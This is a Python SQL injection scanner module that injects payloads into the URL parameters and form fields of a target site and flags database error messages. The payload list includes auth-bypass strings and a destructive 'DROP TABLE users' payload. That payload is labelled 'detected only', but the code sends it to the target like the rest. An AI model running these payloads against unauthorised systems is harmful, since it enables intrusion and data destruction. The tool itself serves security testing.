import requests
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

SQLI_PAYLOADS = [
    ("'", "Syntax Error Probe"),
    ("' OR '1'='1", "Classic Boolean Bypass"),
    ("' OR '1'='1' --", "Comment-based Bypass"),
    ("' OR 1=1 --", "Numeric Boolean Bypass"),
    ("'; DROP TABLE users; --", "Destructive Payload (detected only)"),
    ("' UNION SELECT NULL --", "UNION-based Probe"),
    ("' AND SLEEP(2) --", "Time-based Blind SQLi"),
    ("1' AND '1'='1", "In-band Probe"),
    ("admin'--", "Admin Bypass"),
    ("' OR 'x'='x", "Alternate Boolean Bypass"),
]

ERROR_SIGNATURES = [
    r"sql syntax",
    r"mysql_fetch",
    r"ORA-\d{5}",
    r"microsoft ole db",
    r"sqlite_",
    r"pg_query",
    r"Warning.*mysql",
    r"Unclosed quotation mark",
    r"quoted string not properly terminated",
    r"SQL command not properly ended",
    r"supplied argument is not a valid MySQL",
    r"MySQLSyntaxErrorException",
    r"com\.mysql\.jdbc",
    r"org\.postgresql",
]


def extract_forms(url, session):
    try:
        resp = session.get(url, timeout=10)
        forms = []
        form_matches = re.findall(
            r'<form[^>]*action=["\']?([^"\'> ]*)["\']?[^>]*>(.*?)</form>',
            resp.text, re.IGNORECASE | re.DOTALL
        )
        for action, form_body in form_matches:
            inputs = re.findall(
                r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?',
                form_body, re.IGNORECASE
            )
            if action:
                full_action = urljoin(url, action)
            else:
                full_action = url
            forms.append({"action": full_action, "inputs": inputs})
        return forms
    except Exception:
        return []


def test_url_params(url, session):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return findings

    for param in params:
        for payload, desc in SQLI_PAYLOADS:
            test_params = dict(params)
            test_params[param] = [payload]
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            try:
                resp = session.get(test_url, timeout=8)
                for sig in ERROR_SIGNATURES:
                    if re.search(sig, resp.text, re.IGNORECASE):
                        findings.append({
                            "type": "URL Parameter",
                            "parameter": param,
                            "payload": payload,
                            "description": desc,
                            "evidence": sig,
                            "severity": "HIGH"
                        })
                        break
            except Exception:
                pass
    return findings


def test_form_inputs(url, session):
    findings = []
    forms = extract_forms(url, session)
    for form in forms:
        for payload, desc in SQLI_PAYLOADS:
            data = {name: payload for name, _ in form["inputs"]}
            try:
                resp = session.post(form["action"], data=data, timeout=8)
                for sig in ERROR_SIGNATURES:
                    if re.search(sig, resp.text, re.IGNORECASE):
                        findings.append({
                            "type": "Form Input",
                            "parameter": str([n for n, _ in form["inputs"]]),
                            "payload": payload,
                            "description": desc,
                            "evidence": sig,
                            "severity": "HIGH"
                        })
                        break
            except Exception:
                pass
    return findings


def run_sqli_test(target_url):
    print(f"\n[*] Starting SQL Injection test on {target_url}...")
    session = requests.Session()
    session.headers.update({"User-Agent": "VulnScanner/1.0 (Security Assessment)"})

    all_findings = []
    all_findings += test_url_params(target_url, session)
    all_findings += test_form_inputs(target_url, session)

    if all_findings:
        print(f"  [!] {len(all_findings)} potential SQLi vulnerability(s) found!")
        for f in all_findings:
            print(f"    [HIGH] {f['type']} '{f['parameter']}' - {f['description']}")
    else:
        print(f"  [+] No obvious SQLi vulnerabilities detected.")

    return all_findings